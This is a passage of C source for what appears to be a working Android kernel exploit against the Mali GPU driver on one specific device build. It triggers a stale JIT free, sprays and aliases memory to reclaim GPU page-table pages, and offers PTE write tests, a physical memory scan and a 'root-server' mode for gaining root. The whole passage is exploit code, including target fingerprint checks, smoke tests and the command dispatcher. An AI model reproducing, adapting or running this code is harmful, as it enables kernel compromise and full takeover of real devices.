  while (alias_count * RECLAIM_ALIAS_CHUNK_REGIONS < candidate_count) {
    size_t candidate_offset = alias_count * RECLAIM_ALIAS_CHUNK_REGIONS;
    size_t remaining = candidate_count - candidate_offset;
    size_t chunk_count = remaining < RECLAIM_ALIAS_CHUNK_REGIONS
                             ? remaining
                             : RECLAIM_ALIAS_CHUNK_REGIONS;

    aliases[alias_count] = alias_regions(
        &primary, &candidate_regions[candidate_offset], chunk_count);
    alias_bytes = aliases[alias_count].cpu;
    for (offset = 0; offset < aliases[alias_count].pages * GINZA_MALI_PAGE_SIZE;
         offset += GINZA_MALI_PAGE_SIZE)
      checksum += alias_bytes[offset];
    alias_count++;
  }
  printf("[+] committed and faulted %zu candidates through %zu read-only"
         " aliases (checksum=0x%08" PRIx64 ")\n",
         candidate_count, alias_count, checksum);

  cycle_primary_pool(&primary);
  printf("[+] cycled the primary 64 MiB small-page pool\n");

  printf("[*] submitting stale JIT_FREE to redirect the freed slot\n");
  jit_free(&primary, RECLAIM_JIT_ID, 2);
  replaced_index =
      find_replaced_candidate(&primary, candidate_regions, candidate_count);
  if (replaced_index < 0) {
    fprintf(stderr,
            "[-] the freed JIT slot landed outside the candidate window\n");
    goto cleanup;
  }
  printf("[+] redirected storm region: %u\n",
         candidate_storm_indices[replaced_index]);
  map_reserved_regions(&secondary, reserved);
  printf("[+] mapped deferred regions; second-context GPU tables exist\n");

  __sync_synchronize();
  page_table_candidates = scan_page_table_candidates(
      &aliases[(size_t)replaced_index / RECLAIM_ALIAS_CHUNK_REGIONS], 0,
      (int)candidate_storm_indices[replaced_index], page_tables,
      RECLAIM_SPRAY_PAGES);
  if (page_table_candidates == 0) {
    fprintf(stderr, "[-] replacement found, but no deferred page-table page"
                    " was identified\n");
    printf("[+] holding cross-owned GPU backing open; reboot the device to"
           " release this state\n");
    sleep_forever();
  }

  printf("[+] reclaim stage verified %d read-only page-table candidate%s\n",
         page_table_candidates, page_table_candidates == 1 ? "" : "s");
  if (root_server) {
    bool rooted =
        run_root_server(&primary, &secondary, &scratch, &secondary_job,
                        &secondary_control, &secondary_output, page_tables,
                        (size_t)page_table_candidates, reserved);

    printf("[%c] validated root-server stage %s\n", rooted ? '+' : '-',
           rooted ? "completed" : "did not complete");
  } else if (physical_scan) {
    bool scanned = run_physical_scan(
        &primary, &secondary, &scratch, &secondary_control, &secondary_output,
        page_tables, (size_t)page_table_candidates, reserved);

    printf("[%c] bounded read-only physical scan %s\n", scanned ? '+' : '-',
           scanned ? "completed" : "did not complete");
  } else if (pte_selftest || pte_readtest) {
    bool verified = run_owned_pte_test(
        &primary, &secondary, &scratch, &secondary_job, &secondary_control,
        &secondary_output, pte_readtest, page_tables,
        (size_t)page_table_candidates, reserved);

    printf("[%c] owned-memory PTE %s test %s\n", verified ? '+' : '-',
           pte_readtest ? "readback" : "write",
           verified ? "completed" : "did not verify");
  } else {
    printf("[+] no page-table or kernel-memory write was attempted\n");
  }
  printf("[+] holding both GPU contexts open; reboot the device to release"
         " this state\n");
  sleep_forever();

cleanup:
  for (index = 0; index < RECLAIM_MAX_ALIAS_CHUNKS; index++)
    release_region_best_effort(&primary, &aliases[index]);
  for (index = 0; index < RECLAIM_STORM_REGIONS; index++)
    release_region_best_effort(&primary, &storm_regions[index]);
  release_region_best_effort(&primary, &scratch);
  release_pressure(&pressure);
  release_reserved_regions(&secondary, reserved);
  release_region_best_effort(&secondary, &secondary_job);
  release_region_best_effort(&secondary, &secondary_output);
  release_region_best_effort(&secondary, &secondary_control);
  release_region_best_effort(&secondary, &secondary_executable);
  close_context(&secondary);
  close_context(&primary);
  return status;
}

static int compute_smoke_test(void) {
  const uint64_t seed = UINT64_C(0x4750555245414442);
  struct mali_context context = {.fd = -1};
  struct mali_region executable = {0};
  struct mali_region control = {0};
  struct mali_region source_region = {0};
  struct mali_region output_region = {0};
  volatile uint64_t *source_words;
  volatile uint64_t *destination;
  uint32_t event_code;
  int status = EXIT_FAILURE;
  size_t index;

  setup_context(&context);
  executable = allocate_executable_region(&context, 1);
  control = allocate_region(&context, 1, 1, 0);
  source_region = allocate_region(&context, 1, 1, 0);
  output_region = allocate_region(&context, 1, 1, 0);
  prepare_g52_copy_engine(&executable, &control);

  source_words = source_region.cpu;
  destination = output_region.cpu;
  for (index = 0; index < GINZA_MALI_PAGE_SIZE / sizeof(*source_words);
       index++) {
    source_words[index] = seed ^ (UINT64_C(0x9e3779b97f4a7c15) * index);
    destination[index] = 0;
  }
  __sync_synchronize();

  event_code = gpu_copy_page(&context, &control, source_region.gpu_va,
                             output_region.gpu_va, 4);
  __sync_synchronize();
  if (event_code != BASE_JD_EVENT_DONE) {
    fprintf(stderr, "[-] G52 copy event code: 0x%08" PRIx32 "\n", event_code);
  } else {
    for (index = 0; index < GINZA_MALI_PAGE_SIZE / sizeof(*source_words);
         index++) {
      if (destination[index] != source_words[index]) {
        fprintf(stderr,
                "[-] G52 page copy mismatch at word %zu: expected=0x%016" PRIx64
                " actual=0x%016" PRIx64 "\n",
                index, source_words[index], destination[index]);
        break;
      }
    }
    if (index == GINZA_MALI_PAGE_SIZE / sizeof(*source_words)) {
      printf("[+] native G52 compute copied one exploit-owned 4 KiB page\n");
      status = EXIT_SUCCESS;
    }
  }

  release_region_best_effort(&context, &output_region);
  release_region_best_effort(&context, &source_region);
  release_region_best_effort(&context, &control);
  release_region_best_effort(&context, &executable);
  close_context(&context);
  return status;
}

static int smoke_test(void) {
  struct mali_context context;
  struct mali_context jit_context;
  struct mali_context reserve_context;
  struct mali_region source;
  struct mali_region alias;
  struct mali_region job_region;
  struct mali_region jit_scratch;
  struct reserved_region reserved[RECLAIM_RESERVE_REGIONS] = {0};
  volatile uint32_t *source_words;
  volatile const uint32_t *alias_words;
  uint64_t commit_pages;
  uint64_t va_pages;
  uint32_t event_code;
  size_t index;

  setup_context(&context);
  source = allocate_region(&context, SMOKE_PAGES, 0, 0);
  printf("[+] source: gpu=0x%016" PRIx64 " cpu=%p pages=%" PRIu64 "\n",
         source.gpu_va, source.cpu, source.pages);

  commit_region(&context, source.gpu_va, source.pages);
  commit_pages =
      query_region(&context, source.gpu_va, KBASE_MEM_QUERY_COMMIT_SIZE);
  va_pages = query_region(&context, source.gpu_va, KBASE_MEM_QUERY_VA_SIZE);
  if (commit_pages != source.pages || va_pages != source.pages) {
    fprintf(stderr,
            "[-] allocation query mismatch: commit=%" PRIu64 " va=%" PRIu64
            "\n",
            commit_pages, va_pages);
    return EXIT_FAILURE;
  }

  source_words = source.cpu;
  source_words[0] = SMOKE_WORD;
  source_words[GINZA_MALI_PAGE_SIZE / sizeof(*source_words)] = ALIAS_WORD;

  alias = alias_region(&context, &source);
  printf("[+] alias: gpu=0x%016" PRIx64 " cpu=%p pages=%" PRIu64 "\n",
         alias.gpu_va, alias.cpu, alias.pages);
  alias_words = alias.cpu;
  if (alias_words[0] != SMOKE_WORD ||
      alias_words[GINZA_MALI_PAGE_SIZE / sizeof(*alias_words)] != ALIAS_WORD) {
    fprintf(stderr, "[-] alias does not expose source backing\n");
    return EXIT_FAILURE;
  }

  source_words[0] = ALIAS_WORD;
  if (alias_words[0] != ALIAS_WORD) {
    fprintf(stderr, "[-] source update did not reach read-only alias\n");
    return EXIT_FAILURE;
  }

  job_region = allocate_region(&context, 1, 1, 0);
  event_code = gpu_write32(&context, &job_region,
                           source.gpu_va + 2U * sizeof(uint32_t), GPU_WORD, 1);
  if (event_code != BASE_JD_EVENT_DONE) {
    fprintf(stderr, "[-] WRITE_VALUE event code: 0x%08" PRIx32 "\n",
            event_code);
    return EXIT_FAILURE;
  }
  if (source_words[2] != GPU_WORD || alias_words[2] != GPU_WORD) {
    fprintf(stderr,
            "[-] WRITE_VALUE result mismatch: source=0x%08" PRIx32
            " alias=0x%08" PRIx32 "\n",
            source_words[2], alias_words[2]);
    return EXIT_FAILURE;
  }

  printf(
      "[+] commit/query, read-only aliasing, and GPU WRITE_VALUE verified\n");
  release_region(&context, &job_region);
  release_region(&context, &alias);
  release_region(&context, &source);
  close_context(&context);

  setup_context(&jit_context);
  initialize_jit(&jit_context);
  jit_scratch = allocate_region(&jit_context, 1, 1, 0);
  {
    uint64_t jit_gpu_va =
        jit_allocate(&jit_context, &jit_scratch, RECLAIM_SPRAY_PAGES,
                     RECLAIM_SPRAY_PAGES, RECLAIM_JIT_ID, 1, 1, 1);

    if (query_region(&jit_context, jit_gpu_va, KBASE_MEM_QUERY_COMMIT_SIZE) !=
        RECLAIM_SPRAY_PAGES) {
      fprintf(stderr, "[-] backed JIT allocation has the wrong size\n");
      return EXIT_FAILURE;
    }
    jit_free(&jit_context, RECLAIM_JIT_ID, 2);
  }
  release_region(&jit_context, &jit_scratch);
  close_context(&jit_context);
  printf("[+] backed JIT allocation/free verified\n");

  setup_context(&reserve_context);
  reserve_same_va_regions(&reserve_context, reserved);
  map_reserved_regions(&reserve_context, reserved);
  for (index = 0; index < RECLAIM_RESERVE_REGIONS; index++) {
    volatile uint32_t *words = reserved[index].cpu;

    if (reserved[index].gpu_va != (uintptr_t)reserved[index].cpu) {
      fprintf(stderr, "[-] SAME_VA reservation %zu is not same-VA\n", index);
      return EXIT_FAILURE;
    }
    words[0] = SMOKE_WORD + (uint32_t)index;
    if (words[0] != SMOKE_WORD + (uint32_t)index) {
      fprintf(stderr, "[-] SAME_VA reservation %zu is incoherent\n", index);
      return EXIT_FAILURE;
    }
  }
  release_reserved_regions(&reserve_context, reserved);
  close_context(&reserve_context);
  printf("[+] deferred SAME_VA reserve/map/cleanup verified\n");
  printf("[+] smoke test completed without eviction or stale access\n");
  return EXIT_SUCCESS;
}

static bool read_android_property(const char *name,
                                  char value[TARGET_PROPERTY_MAX]) {
  int descriptors[2];
  pid_t child;
  size_t used = 0;
  int status;

  if (pipe2(descriptors, O_CLOEXEC) < 0) {
    fprintf(stderr, "[-] property pipe: %s\n", strerror(errno));
    return false;
  }
  child = fork();
  if (child < 0) {
    int saved_errno = errno;

    close(descriptors[0]);
    close(descriptors[1]);
    errno = saved_errno;
    fprintf(stderr, "[-] property fork: %s\n", strerror(errno));
    return false;
  }
  if (child == 0) {
    close(descriptors[0]);
    if (dup2(descriptors[1], STDOUT_FILENO) < 0)
      _exit(126);
    close(descriptors[1]);
    execl("/system/bin/getprop", "getprop", name, (char *)NULL);
    _exit(127);
  }

  close(descriptors[1]);
  while (used + 1U < TARGET_PROPERTY_MAX) {
    ssize_t count =
        read(descriptors[0], value + used, TARGET_PROPERTY_MAX - used - 1U);

    if (count > 0) {
      used += (size_t)count;
      continue;
    }
    if (count < 0 && errno == EINTR)
      continue;
    if (count < 0) {
      fprintf(stderr, "[-] read property %s: %s\n", name, strerror(errno));
      close(descriptors[0]);
      (void)waitpid(child, &status, 0);
      return false;
    }
    break;
  }
  close(descriptors[0]);
  while (waitpid(child, &status, 0) < 0) {
    if (errno != EINTR) {
      fprintf(stderr, "[-] wait for property %s: %s\n", name, strerror(errno));
      return false;
    }
  }
  if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
    fprintf(stderr, "[-] getprop %s exited unsuccessfully\n", name);
    return false;
  }
  value[used] = '\0';
  while (used > 0 && (value[used - 1U] == '\n' || value[used - 1U] == '\r'))
    value[--used] = '\0';
  if (used + 1U == TARGET_PROPERTY_MAX) {
    fprintf(stderr, "[-] property %s exceeds the validation buffer\n", name);
    return false;
  }
  return true;
}

static bool match_android_property(const char *name, const char *expected) {
  char value[TARGET_PROPERTY_MAX];

  if (!read_android_property(name, value))
    return false;
  if (strcmp(value, expected) != 0) {
    fprintf(stderr, "[-] target mismatch: %s is %s, expected %s\n", name,
            value[0] ? value : "<empty>", expected);
    return false;
  }
  printf("[+] target match: %s=%s\n", name, value);
  return true;
}

static bool verify_exact_target(void) {
  struct utsname identity;

  if (!match_android_property("ro.product.device", TARGET_DEVICE) ||
      !match_android_property("ro.boot.ammo.prod.var", TARGET_VARIANT) ||
      !match_android_property("ro.build.version.incremental",
                              TARGET_INCREMENTAL) ||
      !match_android_property("ro.build.fingerprint",
                              TARGET_BUILD_FINGERPRINT) ||
      !match_android_property("ro.bootimage.build.fingerprint",
                              TARGET_BOOT_FINGERPRINT))
    return false;
  if (uname(&identity) < 0) {
    fprintf(stderr, "[-] uname: %s\n", strerror(errno));
    return false;
  }
  if (strcmp(identity.release, TARGET_KERNEL_RELEASE) != 0 ||
      strcmp(identity.machine, TARGET_MACHINE) != 0) {
    fprintf(stderr, "[-] target mismatch: kernel is %s %s, expected %s %s\n",
            identity.release, identity.machine, TARGET_KERNEL_RELEASE,
            TARGET_MACHINE);
    return false;
  }
  printf("[+] exact Ginza kernel match: %s %s\n", identity.release,
         identity.machine);
  return true;
}

static void usage(const char *program) {
  fprintf(stderr,
          "usage: %s target-check\n"
          "       %s smoke\n"
          "       %s compute-smoke\n"
          "       %s credential-smoke\n"
          "       %s observe [pressure-mib]\n"
          "       %s reclaim [pressure-mib]\n"
          "       %s pte-test [pressure-mib]\n"
          "       %s pte-read [pressure-mib]\n"
          "       %s phys-scan [pressure-mib]\n"
          "       %s root-server [pressure-mib]\n",
          program, program, program, program, program, program, program,
          program, program, program);
}

static bool isolate_process_credential(void) {
  struct __user_cap_header_struct header = {
      .version = _LINUX_CAPABILITY_VERSION_3,
      .pid = 0,
  };
  struct __user_cap_data_struct data[_LINUX_CAPABILITY_U32S_3];

  memset(data, 0, sizeof(data));
  if (syscall(SYS_capget, &header, data) < 0) {
    fprintf(stderr, "[-] capget credential isolation: %s\n", strerror(errno));
    return false;
  }
  if (syscall(SYS_capset, &header, data) < 0) {
    fprintf(stderr, "[-] capset credential isolation: %s\n", strerror(errno));
    return false;
  }
  printf("[+] created a process-private shell credential\n");
  return true;
}

int main(int argc, char **argv) {
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  if (argc == 2 && strcmp(argv[1], "target-check") == 0)
    return verify_exact_target() ? EXIT_SUCCESS : EXIT_FAILURE;

  if (argc == 2 && strcmp(argv[1], "smoke") == 0)
    return verify_exact_target() ? smoke_test() : EXIT_FAILURE;

  if (argc == 2 && strcmp(argv[1], "compute-smoke") == 0)
    return verify_exact_target() ? compute_smoke_test() : EXIT_FAILURE;

  if (argc == 2 && strcmp(argv[1], "credential-smoke") == 0)
    return isolate_process_credential() ? EXIT_SUCCESS : EXIT_FAILURE;

  if ((argc == 2 || argc == 3) &&
      (strcmp(argv[1], "observe") == 0 || strcmp(argv[1], "reclaim") == 0 ||
       strcmp(argv[1], "pte-test") == 0 || strcmp(argv[1], "pte-read") == 0 ||
       strcmp(argv[1], "phys-scan") == 0 ||
       strcmp(argv[1], "root-server") == 0)) {
    unsigned long pressure_mb = RECLAIM_DEFAULT_PRESSURE_MB;
    char *end = NULL;

    if (!verify_exact_target())
      return EXIT_FAILURE;

    if (argc == 3) {
      errno = 0;
      pressure_mb = strtoul(argv[2], &end, 10);
      if (errno || !end || *end || pressure_mb < RECLAIM_MIN_PRESSURE_MB ||
          pressure_mb > RECLAIM_MAX_PRESSURE_MB ||
          pressure_mb % RECLAIM_PRESSURE_CHUNK_MB) {
        fprintf(stderr, "pressure-mib must be a multiple of %u from %u to %u\n",
                RECLAIM_PRESSURE_CHUNK_MB, RECLAIM_MIN_PRESSURE_MB,
                RECLAIM_MAX_PRESSURE_MB);
        return EXIT_FAILURE;
      }
    }
    return reclaim_test(
        (unsigned int)pressure_mb, strcmp(argv[1], "observe") == 0,
        strcmp(argv[1], "pte-test") == 0, strcmp(argv[1], "pte-read") == 0,
        strcmp(argv[1], "phys-scan") == 0, strcmp(argv[1], "root-server") == 0);
  }

  usage(argv[0]);
  return EXIT_FAILURE;
}
